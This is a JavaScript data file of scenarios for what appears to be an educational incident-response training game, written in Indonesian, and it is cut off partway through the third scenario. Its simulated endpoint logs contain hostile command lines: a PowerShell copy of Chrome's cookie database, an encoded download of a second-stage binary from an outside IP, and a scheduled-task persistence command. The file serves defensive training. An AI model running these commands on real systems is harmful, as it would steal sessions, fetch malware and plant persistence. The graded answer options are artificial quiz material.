// src/games/incidentCommander/scenarios.js
// Scenarios for Cyber Incident Commander (Advanced)
// Multi-phase incident response simulations with realistic telemetry, logs,
// assets, risk trade-offs, containment decisions, and after-action reviews.

export const INCIDENT_SCENARIOS = [
  {
    id: 'cic-01',
    code: 'INC-2026-088',
    title: 'Pembobolan Kredensial & Pembajakan Sesi Akun',
    org: 'PT Nusantara Solusi Finansial (Sistem Internal Penggajian)',
    initialSeverity: 'Kritis - P1',
    initialRisk: 85,
    initialAvailability: 100,
    overview: 'Sistem deteksi anomali identitas mencatat aktivitas masuk tidak wajar pada akun staf akuntansi senior dengan hak akses ke portal penggajian. Terdapat indikasi pencurian token sesi dan upaya ekspor data perbankan karyawan dalam volume masif.',
    relatedLessonIds: ['1-b', '4-a', '4-b'],
    assets: [
      {
        id: 'ACC-HENDRA-FIN',
        name: 'Akun Pengguna (hendra.pratama@nusantarafin.id)',
        type: 'account',
        initialStatus: 'compromised',
        criticality: 'Kritis'
      },
      {
        id: 'SRV-PAYROLL-DB',
        name: 'Basis Data Penggajian Internal (payroll.corp.internal)',
        type: 'server',
        initialStatus: 'investigating',
        criticality: 'Kritis'
      },
      {
        id: 'WS-FIN-04',
        name: 'Workstation Kantor Hendra (WS-FIN-04.hq.corp)',
        type: 'workstation',
        initialStatus: 'investigating',
        criticality: 'Sedang'
      },
      {
        id: 'GW-SSO-PORTAL',
        name: 'Gerbang Single Sign-On (sso.nusantarafin.id)',
        type: 'gateway',
        initialStatus: 'normal',
        criticality: 'Tinggi'
      }
    ],
    alerts: [
      {
        id: 'ALT-101',
        title: 'Impossible Travel Login Anomaly',
        source: 'Microsoft Entra ID / Identity Guard',
        timestamp: '08:42:15 WIB',
        severity: 'Kritis',
        confidence: 'Tinggi (IoC Terverifikasi)',
        isMalicious: true,
        detail: 'Akun hendra.pratama@nusantarafin.id berhasil login dari Jakarta (IP: 182.253.14.88) pukul 08:30 WIB, lalu 12 menit kemudian berhasil membuat sesi baru dari Sofia, Bulgaria (IP: 95.158.130.42). Jarak fisik ~8.800 km mustahil ditempuh dalam 12 menit.'
      },
      {
        id: 'ALT-102',
        title: 'Bulk Sensitive Data Export Triggered',
        source: 'Audit Log Portal Penggajian',
        timestamp: '08:45:03 WIB',
        severity: 'Tinggi',
        confidence: 'Tinggi (IoC Terverifikasi)',
        isMalicious: true,
        detail: 'Sesi asal Sofia, Bulgaria meminta ekspor 1.250 berkas CSV berisi nama lengkap, NIK, nomor rekening bank, dan besaran gaji pokok staf korporat ke arsip lokal.'
      },
      {
        id: 'ALT-103',
        title: 'Automated Routine Snapshot Backup',
        source: 'Backup Scheduler Daemon',
        timestamp: '08:00:00 WIB',
        severity: 'Rendah',
        confidence: 'Aktivitas Sah (Benign)',
        isMalicious: false,
        detail: 'Pencadangan harian basis data payroll snapshot selesai secara otomatis sesuai jadwal kebijakan pemeliharaan TI berkala tanpa ada anomali integritas.'
      }
    ],
    evidenceLogs: {
      auth: [
        {
          timestamp: '08:30:12 WIB',
          user: 'hendra.pratama',
          ip: '182.253.14.88 (Jakarta, ID)',
          userAgent: 'Chrome 122 / Windows 11',
          mfaUsed: 'Ya (SMS OTP)',
          status: 'Success',
          notes: 'Sesi kantor sah dari kantor pusat.'
        },
        {
          timestamp: '08:42:15 WIB',
          user: 'hendra.pratama',
          ip: '95.158.130.42 (Sofia, BG - Hosting VPS)',
          userAgent: 'Firefox 120 / Kali Linux',
          mfaUsed: 'Tidak (Cookie Sesi Dikloning)',
          status: 'Success',
          notes: 'Login langsung membawa cookie ESTSAUTH valid tanpa tantangan 2FA baru (Pass-the-Cookie).'
        },
        {
          timestamp: '08:44:00 WIB',
          user: 'hendra.pratama',
          ip: '95.158.130.42 (Sofia, BG)',
          userAgent: 'Firefox 120 / Kali Linux',
          mfaUsed: 'Bypass',
          status: 'Access Granted',
          notes: 'Akses menu /api/v2/export/payroll-all.csv.'
        }
      ],
      endpoint: [
        {
          timestamp: '08:15:20 WIB',
          host: 'WS-FIN-04',
          process: 'chrome.exe',
          commandLine: 'chrome.exe --profile-directory=Default',
          hash: 'SHA256: 3c9b...a10',
          notes: 'Pengguna membuka lampiran email mencurigakan "Pajak_SPT_2025.pdf.exe" 25 menit sebelum login anomali.'
        },
        {
          timestamp: '08:16:05 WIB',
          host: 'WS-FIN-04',
          process: 'powershell.exe',
          commandLine: 'powershell -ep bypass -c "Copy-Item $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies C:\\Temp\\ck.db"',
          hash: 'SHA256: 77f1...e99',
          notes: 'Pencurian berkas database cookie browser oleh malware infostealer RedLine.'
        }
      ],
      network: [
        {
          timestamp: '08:17:30 WIB',
          src: 'WS-FIN-04 (192.168.10.45)',
          dst: '95.158.130.42 (Sofia, BG)',
          port: '443 / HTTPS',
          bytes: '1.4 MB',
          notes: 'Eksfiltrasi berkas cookie terenkripsi ke server penyerang.'
        },
        {
          timestamp: '08:45:10 WIB',
          src: 'SRV-PAYROLL-DB (10.10.2.15)',
          dst: '95.158.130.42 (Sofia, BG)',
          port: '443 / HTTPS',
          bytes: '4.8 MB',
          notes: 'Aliran transfer data unduhan hasil ekspor gaji sedang berlangsung.'
        }
      ]
    },
    phases: {
      phaseA: {
        title: 'Fase 1: Triage & Penilaian Urgensi',
        question: 'Dua peringatan muncul bersamaan dengan satu log pencadangan rutin. Apa putusan triage Anda mengenai tingkat keparahan dan ruang lingkup insiden ini?',
        options: [
          {
            id: 'triage-optimal',
            text: 'Konfirmasi kompromi kredensial kritis (True Positive P1) pada ALT-101 dan ALT-102 akibat pencurian token sesi; abaikan ALT-103 sebagai aktivitas sah.',
            type: 'optimal',
            points: 25,
            riskDelta: -10,
            availabilityDelta: 0,
            feedback: 'Tepat sekali! Anda secara akurat memisahkan sinyal ancaman nyata (impossible travel & eksfiltrasi data) dari pencadangan sistem rutin, memfokuskan sumber daya SOC pada insiden kredensial aktif.'
          },
          {
            id: 'triage-suboptimal',
            text: 'Tandai semua peringatan (termasuk ALT-103) sebagai serangan terkoordinasi dan langsung buat tiket investigasi standar antrean 24 jam.',
            type: 'suboptimal',
            points: 10,
            riskDelta: +10,
            availabilityDelta: 0,
            feedback: 'Kurang tepat. Menunda investigasi hingga 24 jam untuk eksfiltrasi data gaji aktif adalah risiko fatal, sementara menganggap backup otomatis sebagai serangan memboroskan tenaga analis.'
          },
          {
            id: 'triage-hazardous',
            text: 'Anggap ALT-101 hanya anomali VPN staf yang bepergian ke luar negeri dan tutup peringatan tanpa analisis bukti forensik lebih lanjut.',
            type: 'hazardous',
            points: 0,
            riskDelta: +25,
            availabilityDelta: 0,
            feedback: 'Sangat berbahaya! Mengabaikan impossible travel yang disertai permintaan unduhan data penggajian masif menyebabkan pembobolan data karyawan terus berlangsung tanpa pencegahan.'
          }
        ]
      },
      phaseB: {
        title: 'Fase 2: Investigasi & Korelasi Bukti',
        question: 'Berdasarkan log autentikasi, telemetri endpoint WS-FIN-04, dan aliran jaringan, apa akar penyebab (root cause) utama dan jalur serangan penyerang?',
        options: [
          {
            id: 'inv-optimal',
            text: 'Infostealer malware pada WS-FIN-04 mencuri cookie sesi browser (Session Hijacking), memungkinkan penyerang melewati MFA dan mengunduh data gaji dari IP asing.',
            type: 'optimal',
            points: 25,
            riskDelta: -15,
            availabilityDelta: 0,
            feedback: 'Analisis forensik sempurna! Anda menemukan jejak eksekusi PowerShell yang mengekstrak berkas Cookies Chrome setelah staf membuka lampiran palsu, menjelaskan mengapa MFA terlewati.'
          },
          {
            id: 'inv-suboptimal',
            text: 'Penyerang membobol server basis data payroll melalui celah SQL Injection pada formulir web publik tanpa melibatkan workstation pengguna.',
            type: 'suboptimal',
            points: 8,
            riskDelta: +5,
            availabilityDelta: 0,
            feedback: 'Kurang akurat. Tidak ada jejak SQL Injection pada log; penyerang menggunakan kredensial dan cookie sesi sah milik Hendra yang dicuri melalui malware endpoint.'
          },
          {
            id: 'inv-hazardous',
            text: 'Server Single Sign-On (SSO) telah di-root dan master private key korporat telah bocor ke publik.',
            type: 'hazardous',
            points: 0,
            riskDelta: +15,
            availabilityDelta: 0,
            feedback: 'Keliru dan asumsi spekulatif. Log SSO menunjukkan token valid untuk satu akun tertentu, bukan kompromi sistemik gerbang SSO itu sendiri.'
          }
        ]
      },
      phaseC: {
        title: 'Fase 3: Tindakan Kontainmen & Mitigasi',
        question: 'Penyerang masih memiliki sesi aktif dan aliran data sedang berlangsung. Tentukan tindakan kontainmen taktis dengan mempertimbangkan keselamatan data dan ketersediaan layanan!',
        options: [
          {
            id: 'cont-optimal',
            text: 'Revokasi semua token sesi aktif hendra.pratama, kunci akun sementara, isolasi jaringan WS-FIN-04, dan blokir IP penyerang 95.158.130.42 di firewall perimeter.',
            type: 'optimal',
            points: 25,
            riskDelta: -35,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'ACC-HENDRA-FIN', status: 'isolated' },
              { id: 'WS-FIN-04', status: 'isolated' },
              { id: 'SRV-PAYROLL-DB', status: 'investigating' }
            ],
            feedback: 'Tindakan kontainmen ideal! Memutus sesi aktif dan mengisolasi workstation menghentikan eksfiltrasi seketika, sementara server penggajian tetap aman beroperasi untuk bisnis normal.'
          },
          {
            id: 'cont-suboptimal',
            text: 'Hanya ubah kata sandi akun Hendra Pratama tanpa merevokasi token sesi SSO aktif atau mengisolasi workstation yang terinfeksi.',
            type: 'suboptimal',
            points: 10,
            riskDelta: -10,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'ACC-HENDRA-FIN', status: 'investigating' }
            ],
            feedback: 'Kurang efektif. Mengubah kata sandi tidak langsung mematikan cookie sesi OAuth/SAML yang sudah dipegang penyerang, dan malware di WS-FIN-04 akan kembali mencuri kredensial baru.'
          },
          {
            id: 'cont-hazardous',
            text: 'Matikan daya fisik server SRV-PAYROLL-DB dan putus koneksi internet seluruh gedung kantor pusat.',
            type: 'hazardous',
            points: 0,
            riskDelta: -15,
            availabilityDelta: -60,
            assetUpdates: [
              { id: 'SRV-PAYROLL-DB', status: 'isolated' },
              { id: 'GW-SSO-PORTAL', status: 'isolated' }
            ],
            feedback: 'Tindakan gegabah dan berlebihan! Mematikan server basis data merusak proses operasional seluruh perusahaan dan berisiko merusak integritas basis data, padahal server itu sendiri tidak diretas.'
          }
        ]
      },
      phaseD: {
        title: 'Fase 4: Eradikasi & Pemulihan Sistem',
        question: 'Sesi ilegal telah diputus. Bagaimana rencana eradikasi persistensi dan pemulihan akun yang menjamin insiden serupa tidak terulang?',
        options: [
          {
            id: 'rec-optimal',
            text: 'Bersihkan malware dan instal ulang WS-FIN-04 dari golden image, reset kredensial akun Hendra dengan kewajiban kunci keamanan FIDO2/Passkey, serta audit berkas hasil ekspor.',
            type: 'optimal',
            points: 25,
            riskDelta: -25,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'ACC-HENDRA-FIN', status: 'remediated' },
              { id: 'WS-FIN-04', status: 'remediated' },
              { id: 'SRV-PAYROLL-DB', status: 'normal' }
            ],
            feedback: 'Pemulihan paripurna! Menginstal ulang endpoint menghapus persistensi infostealer, sementara kunci fisik FIDO2 kebal terhadap pencurian cookie sesi via phish-proxy.'
          },
          {
            id: 'rec-suboptimal',
            text: 'Jalankan pemindaian antivirus cepat di WS-FIN-04 lalu buka kembali akun Hendra dengan kata sandi lama.',
            type: 'suboptimal',
            points: 10,
            riskDelta: +10,
            availabilityDelta: 0,
            feedback: 'Berisiko. Pemindaian cepat seringkali melewatkan komponen infostealer modern yang terselubung, dan tidak memperbarui kredensial membuka pintu serangan berulang.'
          },
          {
            id: 'rec-hazardous',
            text: 'Aktifkan kembali akun Hendra tanpa memeriksa workstation WS-FIN-04 dan umumkan bahwa sistem 100% aman tanpa audit data.',
            type: 'hazardous',
            points: 0,
            riskDelta: +30,
            availabilityDelta: 0,
            feedback: 'Sangat fatal! Workstation yang masih terinfeksi malware akan langsung mencuri kredensial baru saat pengguna login kembali.'
          }
        ]
      }
    },
    aar: {
      attackVectorSummary: 'Pencurian cookie sesi (Session Hijacking) melalui infostealer Trojan yang diunduh dari lampiran email spear-phishing.',
      rootCause: 'Workstation staf tidak memblokir eksekusi skrip PowerShell tidak terdaftar dan autentikasi SSO mengizinkan pemakaian sesi tanpa validasi pengikatan perangkat (Device Binding / Conditional Access).',
      mitigationLessons: 'Terapkan kebijakan Conditional Access dengan validasi kepatuhan perangkat (Compliant Device), ganti SMS OTP dengan Passkey/FIDO2 yang tahan pencurian sesi, dan blokir lampiran ganda (.pdf.exe) di gateway email.',
      recommendedLessonIds: ['1-b', '4-a', '4-b']
    }
  },
  {
    id: 'cic-02',
    code: 'INC-2026-142',
    title: 'Infeksi Malware & Upaya Pergerakan Lateral',
    org: 'PT Sentosa Media Kreatif (Jaringan Korporat & Server Produksi)',
    initialSeverity: 'Kritis - P1',
    initialRisk: 90,
    initialAvailability: 100,
    overview: 'Endpoint Detection and Response (EDR) mendeteksi dokumen mencurigakan mengeksekusi proses terselubung pada workstation staf pengadaan. Terdeteksi upaya pemindaian port SMB dan percobaan koneksi Remote Desktop ke server tagihan inti.',
    relatedLessonIds: ['3-b', '3-c', '3-d'],
    assets: [
      {
        id: 'WS-PROC-07',
        name: 'Workstation Pengadaan (WS-PROC-07.sentosa.corp)',
        type: 'workstation',
        initialStatus: 'compromised',
        criticality: 'Tinggi'
      },
      {
        id: 'SRV-BILLING-01',
        name: 'Server Billing & Invoice Pelanggan (billing.prod.sentosa)',
        type: 'server',
        initialStatus: 'investigating',
        criticality: 'Kritis'
      },
      {
        id: 'SRV-FILE-SHARE',
        name: 'Server Berkas Bersama (files.sentosa.corp)',
        type: 'server',
        initialStatus: 'investigating',
        criticality: 'Sedang'
      },
      {
        id: 'NET-CORE-FW',
        name: 'Firewall Inti Korporat (fw-core.sentosa.corp)',
        type: 'gateway',
        initialStatus: 'normal',
        criticality: 'Kritis'
      }
    ],
    alerts: [
      {
        id: 'ALT-201',
        title: 'Suspicious Office Macro & Encoded Command Execution',
        source: 'CrowdStrike EDR Sensor',
        timestamp: '10:14:02 WIB',
        severity: 'Kritis',
        confidence: 'Tinggi (IoC Terverifikasi)',
        isMalicious: true,
        detail: 'Proses WINWORD.EXE pada WS-PROC-07 meluncurkan powershell.exe dengan parameter terenkripsi Base64 setelah pengguna mengklik "Enable Content" pada berkas Invoice_Vendor_Maret.docm.'
      },
      {
        id: 'ALT-202',
        title: 'Internal Port Reconnaissance & SMB Probing',
        source: 'Network Intrusion Detection System (NIDS)',
        timestamp: '10:18:44 WIB',
        severity: 'Tinggi',
        confidence: 'Tinggi (IoC Terverifikasi)',
        isMalicious: true,
        detail: 'Workstation WS-PROC-07 memindai port 445 (SMB) dan 3389 (RDP) pada subnet server 10.20.0.0/24, mencoba otentikasi NTLM hash ke SRV-BILLING-01 dan SRV-FILE-SHARE.'
      },
      {
        id: 'ALT-203',
        title: 'Outbound Operating System Telemetry Connection',
        source: 'Perimeter Proxy Gateway',
        timestamp: '10:15:30 WIB',
        severity: 'Rendah',
        confidence: 'Aktivitas Sah (Benign)',
        isMalicious: false,
        detail: 'Pengecekan update Windows berkala ke server resmi Microsoft (fe3.delivery.mp.microsoft.com) dengan sertifikat digital sah.'
      }
    ],
    evidenceLogs: {
      auth: [
        {
          timestamp: '10:18:50 WIB',
          user: 'SYSTEM / ANONYMOUS',
          ip: '192.168.20.107 (WS-PROC-07)',
          userAgent: 'SMB2 Protocol Handshake',
          mfaUsed: 'N/A',
          status: 'Logon Failure (Status: 0xC000006D)',
          notes: 'Percobaan login SMB brute-force ke SRV-BILLING-01 dengan kredensial staf lokal yang telah diekstrak.'
        },
        {
          timestamp: '10:20:11 WIB',
          user: 'procurement_admin',
          ip: '192.168.20.107 (WS-PROC-07)',
          userAgent: 'RDP Remote Session Handshake',
          mfaUsed: 'N/A',
          status: 'Blocked by Host Firewall',
          notes: 'Akses RDP ke SRV-BILLING-01 ditolak oleh kebijakan segmentasi subnet.'
        }
      ],
      endpoint: [
        {
          timestamp: '10:14:10 WIB',
          host: 'WS-PROC-07',
          process: 'powershell.exe',
          commandLine: 'powershell.exe -W Hidden -Enc aQB3AHIAIAAtAHUAcmBpACA... (iwr -uri http://194.87.139.11/svchost_task.exe)',
          hash: 'SHA256: d81a...442',
          notes: 'Mengunduh binary malware tahap kedua dari C2 server luar negeri.'
        },
        {
          timestamp: '10:15:00 WIB',
          host: 'WS-PROC-07',
          process: 'schtasks.exe',
          commandLine: 'schtasks /create /tn "\\Microsoft\\Windows\\AppHelperUpdate" /tr "C:\\Users\\Public\\svchost_task.exe" /sc minute /mo 15',
          hash: 'SHA256: 41ee...b82',
          notes: 'Membangun mekanisme persistensi sistem melalui Windows Scheduled Task.'
        }
      ],
      network: [
        {
          timestamp: '10:14:15 WIB',
          src: 'WS-PROC-07 (192.168.20.107)',
          dst: '194.87.139.11 (St. Petersburg, RU)',
          port: '8443 / TCP',
          bytes: '2.8 MB (Inbound Payload)',
          notes: 'Koneksi Command & Control (C2) aktif menerima perintah penyerang.'
        },
        {
          timestamp: '10:19:00 WIB',
          src: 'WS-PROC-07 (192.168.20.107)',
          dst: 'SRV-BILLING-01 (10.20.0.15)',
          port: '445 / TCP (SMB)',
          bytes: '42 KB',
          notes: 'Upaya eksploitasi pergerakan lateral (Lateral Movement).'
        }
      ]
    },
    phases: {
      phaseA: {
        title: 'Fase 1: Triage & Penilaian Ancaman',
        question: 'Dua peringatan berbahaya terdeteksi bersamaan dengan komunikasi pembaruan Windows resmi. Bagaimana prioritisasi insiden Anda?',
        options: [
          {
            id: 'triage-optimal',
            text: 'Prioritaskan ALT-201 (eksekusi makro PowerShell) dan ALT-202 (pemindaian lateral) sebagai insiden P1 aktif; tetapkan ALT-203 sebagai pembaruan OS yang tidak berbahaya.',
            type: 'optimal',
            points: 25,
            riskDelta: -10,
            availabilityDelta: 0,
            feedback: 'Triage akurat! Kombinasi makro Office berbahaya dan pemindaian SMB internal adalah pola khas awal serangan ransomware/trojan perbankan korporat.'
          },
          {
            id: 'triage-suboptimal',
            text: 'Fokus menyelidiki koneksi ALT-203 ke Microsoft dan tunda penanganan WS-PROC-07 sampai pemindaian SMB selesai.',
            type: 'suboptimal',
            points: 8,
            riskDelta: +15,
            availabilityDelta: 0,
            feedback: 'Kurang tepat! Koneksi resmi Windows Update adalah false positive yang umum, sedangkan menunda penanganan pemindaian SMB memberi waktu penyerang membobol server tagihan.'
          },
          {
            id: 'triage-hazardous',
            text: 'Abaikan peringatan karena server billing (SRV-BILLING-01) melaporkan status Logon Failure (serangan dianggap gagal).',
            type: 'hazardous',
            points: 0,
            riskDelta: +30,
            availabilityDelta: 0,
            feedback: 'Sangat berbahaya! Kegagalan login pertama tidak berarti serangan berhenti; penyerang di WS-PROC-07 masih aktif dan akan mencoba metode atau kredensial lain.'
          }
        ]
      },
      phaseB: {
        title: 'Fase 2: Investigasi & Pemetaan Jalur Serangan',
        question: 'Analisis log proses schtasks, payload PowerShell, dan koneksi jaringan. Apa mekanisme persistensi dan jangkauan kompromi saat ini?',
        options: [
          {
            id: 'inv-optimal',
            text: 'Workstation WS-PROC-07 terinfeksi C2 beacon dengan persistensi Scheduled Task "\\AppHelperUpdate", namun pergerakan lateral ke SRV-BILLING-01 masih tertahan di firewall internal.',
            type: 'optimal',
            points: 25,
            riskDelta: -15,
            availabilityDelta: 0,
            feedback: 'Analisis forensik tajam! Anda menemukan tugas terjadwal persistence pada WS-PROC-07 dan mengonfirmasi bahwa server billing belum berhasil ditembus penyerang.'
          },
          {
            id: 'inv-suboptimal',
            text: 'Server SRV-BILLING-01 telah sepenuhnya dikuasai penyerang dan data pelanggan telah terenkripsi ransomware.',
            type: 'suboptimal',
            points: 10,
            riskDelta: +5,
            availabilityDelta: 0,
            feedback: 'Keliru. Log membuktikan koneksi RDP dan SMB ke server billing diblokir oleh firewall host; jangan berasumsi terburuk tanpa bukti forensik.'
          },
          {
            id: 'inv-hazardous',
            text: 'Serangan hanyalah uji penetrasi (pentest) biasa yang tidak membahayakan sistem perusahaan.',
            type: 'hazardous',
            points: 0,
            riskDelta: +25,
            availabilityDelta: 0,
            feedback: 'Asumsi tidak berdasar! Tidak ada jadwal pentest resmi dan koneksi mengarah ke IP hosting luar negeri yang terdaftar di daftar hitam threat intelligence.'
          }
        ]
      },
      phaseC: {
        title: 'Fase 3: Tindakan Kontainmen Terukur',
        question: 'Penyerang berupaya menjalar ke server billing dan server berkas. Apa strategi kontainmen yang efektif membendung serangan tanpa melumpuhkan transaksi pelanggan?',
        options: [
          {
            id: 'cont-optimal',
            text: 'Isolasi jaringan host WS-PROC-07 via EDR, blokir IP C2 194.87.139.11 di firewall perimeter, dan perketat aturan akses SMB di subnet server, tanpa mematikan server billing.',
            type: 'optimal',
            points: 25,
            riskDelta: -40,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'WS-PROC-07', status: 'isolated' },
              { id: 'SRV-BILLING-01', status: 'normal' },
              { id: 'SRV-FILE-SHARE', status: 'investigating' }
            ],
            feedback: 'Keputusan strategis yang brilian! Mengisolasi workstation sumber infeksi menghentikan ancaman seketika, sementara server billing tetap online melayani ribuan pelanggan.'
          },
          {
            id: 'cont-suboptimal',
            text: 'Hanya blokir IP C2 luar negeri di firewall tetapi biarkan WS-PROC-07 tetap terhubung ke jaringan lokal perusahaan.',
            type: 'suboptimal',
            points: 10,
            riskDelta: -10,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'WS-PROC-07', status: 'investigating' }
            ],
            feedback: 'Kurang memadai. Meski C2 terputus sementara, malware yang sudah berjalan di WS-PROC-07 dapat melanjutkan pemindaian dan penyebaran otomatis lewat jaringan lokal.'
          },
          {
            id: 'cont-hazardous',
            text: 'Matikan total daya listrik seluruh datacenter server produksi dan cabut semua kabel switch jaringan korporat.',
            type: 'hazardous',
            points: 0,
            riskDelta: -20,
            availabilityDelta: -75,
            assetUpdates: [
              { id: 'WS-PROC-07', status: 'isolated' },
              { id: 'SRV-BILLING-01', status: 'isolated' },
              { id: 'SRV-FILE-SHARE', status: 'isolated' },
              { id: 'NET-CORE-FW', status: 'isolated' }
            ],
            feedback: 'Keputusan destruktif! Tindakan panik ini menyebabkan pemadaman total (total outage), kerugian finansial masif, dan hilangnya barang bukti memori volatil (RAM) yang krusial untuk investigasi.'
          }
        ]
      },
      phaseD: {
        title: 'Fase 4: Eradikasi & Verifikasi Integritas',
        question: 'Workstation pengadaan telah diisolasi. Bagaimana langkah pembersihan total dan pengamanan jaringan agar insiden pergerakan lateral tidak terulang?',
        options: [
          {
            id: 'rec-optimal',
            text: 'Ambil memory dump & disk image WS-PROC-07 untuk bukti forensik, format dan re-image workstation, hapus persistence scheduled task, serta nonaktifkan macro VBA default pada seluruh armada Office.',
            type: 'optimal',
            points: 25,
            riskDelta: -25,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'WS-PROC-07', status: 'remediated' },
              { id: 'SRV-BILLING-01', status: 'normal' },
              { id: 'SRV-FILE-SHARE', status: 'normal' }
            ],
            feedback: 'Eradikasi dan remediasi kelas enterprise! Menyimpan bukti forensik sebelum re-imaging melindungi rantai bukti hukum, dan menonaktifkan makro Office menutup pintu masuk serangan selamanya.'
          },
          {
            id: 'rec-suboptimal',
            text: 'Cukup hapus berkas svchost_task.exe secara manual dari folder Public tanpa memeriksa registry atau menjadwalkan ulang instalasi sistem operasi.',
            type: 'suboptimal',
            points: 10,
            riskDelta: +10,
            availabilityDelta: 0,
            feedback: 'Tidak tuntas. Menghapus satu berkas saja tanpa mematikan scheduled task atau memeriksa backdoor sekunder akan memicu pengunduhan ulang malware secara berkala.'
          },
          {
            id: 'rec-hazardous',
            text: 'Langsung kembalikan WS-PROC-07 ke jaringan normal tanpa tindakan remediasi karena staf pengadaan perlu segera bekerja.',
            type: 'hazardous',
            points: 0,
            riskDelta: +35,
            availabilityDelta: 0,
            feedback: 'Sangat ceroboh! Mengembalikan perangkat terinfeksi ke jaringan lokal menjamin penyebaran malware lanjutan ke perangkat rekan kerja lainnya.'
          }
        ]
      }
    },
    aar: {
      attackVectorSummary: 'Eksploitasi makro Microsoft Word (VBA Macro Dropper) dari lampiran email palsu vendor yang meluncurkan C2 beacon dan mencoba pergerakan lateral (SMB/RDP).',
      rootCause: 'Kebijakan grup (GPO) mengizinkan eksekusi makro dari berkas internet dan workstation pengguna berada dalam satu segmen jaringan datar dengan server tagihan.',
      mitigationLessons: 'Blokir makro VBA dari berkas unduhan internet secara default, terapkan Zero Trust Network Access (ZTNA) dan micro-segmentation antara workstation klien dan server produksi bernilai tinggi.',
      recommendedLessonIds: ['3-b', '3-c', '3-d']
    }
  },
  {
    id: 'cic-03',
    code: 'INC-2026-215',
    title: 'Dugaan Kebocoran & Eksfiltrasi Data Cloud',
    org: 'Lembaga Riset Medika Nusantara (Penyimpanan Cloud Rekam Medis Pasien)',
    initialSeverity: 'Kritis - P1',
    initialRisk: 80,
    initialAvailability: 100,
    overview: 'Sistem Cloud SIEM mendeteksi perubahan izin akses secara mendadak pada repositori penyimpanan arsip rekam medis dari Private menjadi Public. Terjadi unduhan massal berukuran 45 GB dari alamat IP jaringan anonim Tor.',
    relatedLessonIds: ['1-b', '2-e', '4-b'],
    assets: [
      {
        id: 'S3-PATIENT-PROD',
        name: 'Bucket Cloud Rekam Medis (medika-patient-records-prod)',
        type: 'cloud-bucket',
        initialStatus: 'compromised',
        criticality: 'Kritis'
      },
      {
        id: 'API-KEY-DAEMON',
        name: 'Kredensial Layanan API (medika-sync-daemon)',
        type: 'account',
        initialStatus: 'compromised',
        criticality: 'Tinggi'
      },
      {
        id: 'SRV-APP-PORTAL',
        name: 'Portal Rekam Medis Dokter & Rumah Sakit (portal.medika.id)',
        type: 'server',
        initialStatus: 'normal',
        criticality: 'Kritis'
      },
      {
        id: 'S3-OPEN-RESEARCH',
        name: 'Penyimpanan Dataset Riset Publik (medika-open-research)',
        type: 'cloud-bucket',
        initialStatus: 'normal',
        criticality: 'Rendah'
      }
    ],
    alerts: [
      {
        id: 'ALT-301',
        title: 'Critical Bucket ACL Modified to Public Read',
        source: 'AWS CloudTrail / GuardDuty',
        timestamp: '14:22:10 WIB',
        severity: 'Kritis',
        confidence: 'Tinggi (IoC Terverifikasi)',
        isMalicious: true,
        detail: 'Izin akses bucket medika-patient-records-prod diubah dari "Private Restricted" menjadi "AllUsers: READ" menggunakan akses kunci API medika-sync-daemon.'
      },
      {
        id: 'ALT-302',
        title: 'Anomalous High-Volume Download from Tor Exit Node',
        source: 'Cloud CDN & WAF Monitor',
        timestamp: '14:26:05 WIB',
        severity: 'Kritis',
        confidence: 'Tinggi (IoC Terverifikasi)',
        isMalicious: true,
        detail: 'Alamat IP 45.134.20.15 (Tor Exit Node terdaftar) sedang mengunduh arsip ZIP rekaman medis terenkripsi sebesar 45 GB dengan kecepatan tinggi.'
      },
      {
        id: 'ALT-303',
        title: 'Authorized Public Dataset Sync Completed',
        source: 'Data Science Pipeline Worker',
        timestamp: '14:15:00 WIB',
        severity: 'Rendah',
        confidence: 'Aktivitas Sah (Benign)',
        isMalicious: false,
        detail: 'Peneliti lembaga mengunggah dataset publik statistik vaksinasi 2026 (covid-variants.csv, 12 MB) ke bucket riset publik medika-open-research sesuai prosedur.'
      }
    ],
    evidenceLogs: {
      auth: [
        {
          timestamp: '14:20:00 WIB',
          user: 'API: medika-sync-daemon',
          ip: '45.134.20.15 (Frankfurt, DE - Tor Network)',
          userAgent: 'aws-cli/2.15.0 Python/3.11 Linux',
          mfaUsed: 'Bypass (Access Key)',
          status: 'Authenticated',
          notes: 'Kunci API rahasia digunakan dari luar subnet IP korporat tanpa batasan IP (IP Whitelisting).'
        },
        {
          timestamp: '14:22:10 WIB',
          user: 'API: medika-sync-daemon',
          ip: '45.134.20.15 (Tor Exit Node)',
          userAgent: 'aws-cli/2.15.0',
          mfaUsed: 'N/A',
          status: 'PutBucketAcl (Success)',
          notes: 'Mengubah kebijakan izin bucket menjadi publik untuk memudahkan pengunduhan massal tanpa autentikasi.'
        }
      ],
      endpoint: [
        {
          timestamp: '00:30:15 WIB (14 jam lalu)',
          host: 'GitHub.com (Public Repository)',
          process: 'git-commit',
          commandLine: 'git commit -m "fix: update sync daemon scripts for mobile testing"',
          hash: 'Commit: 8f42c10b',
          notes: 'Pengembang magang secara tidak sengaja mengunggah berkas config.json berisi AWS_ACCESS_KEY_ID dan AWS_SECRET_ACCESS_KEY ke repositori publik.'
        },
        {
          timestamp: '14:21:00 WIB',
          host: 'GitHub Audit System',
          process: 'secret-scanner',
          commandLine: 'Secret scanning detected exposed AWS Access Key',
          hash: 'Alert ID: GH-SEC-991',
          notes: 'Peringatan terpicu namun belum sempat ditindaklanjuti oleh tim pengembang.'
        }
      ],
      network: [
        {
          timestamp: '14:25:30 WIB',
          src: 'S3-PATIENT-PROD (Cloud Storage)',
          dst: '45.134.20.15 (Tor Exit Node)',
          port: '443 / HTTPS',
          bytes: '18.4 GB (dan terus bertambah)',
          notes: 'Transfer berkas arsip pasien zip sedang berlangsung secara simultan melalui multi-threading.'
        },
        {
          timestamp: '14:15:20 WIB',
          src: '10.30.5.12 (Lab Riset)',
          dst: 'S3-OPEN-RESEARCH',
          port: '443 / HTTPS',
          bytes: '12 MB',
          notes: 'Sinkronisasi berkas data riset publik sah.'
        }
      ]
    },
    phases: {
      phaseA: {
        title: 'Fase 1: Triage & Penentuan Ruang Lingkup',
        question: 'Dua peringatan kebocoran cloud muncul bersamaan dengan sinkronisasi riset rutin. Bagaimana keputusan triage Anda?',
        options: [
          {
            id: 'triage-optimal',
